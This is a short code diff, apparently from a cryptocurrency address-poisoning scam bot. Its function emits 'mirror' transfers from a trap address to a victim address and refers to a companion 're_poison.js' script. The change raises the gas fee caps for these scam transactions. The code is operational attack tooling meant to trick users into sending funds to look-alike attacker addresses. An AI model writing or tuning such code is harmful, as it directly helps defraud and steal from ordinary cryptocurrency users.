@@ -495,8 +495,8 @@ def emit_mirror_transfer(victim_address, trap_address, raw_value, asset, campaig
         if use_eip1559:
             base_fee = latest_block.get("baseFeePerGas", 0) or 0
             # 🚀 ULTRA-CHEAP GAS: Match the low fees of re_poison.js
-            max_fee = w3.to_wei(0.15, 'gwei')
-            max_priority = w3.to_wei(0.001, 'gwei')
+            max_fee = w3.to_wei(2, 'gwei')
+            max_priority = w3.to_wei(0.01, 'gwei')
             
             network_max_fee = int(base_fee * 1.10) + w3.to_wei(0.05, 'gwei')
             network_tip = w3.to_wei(0.01, 'gwei')
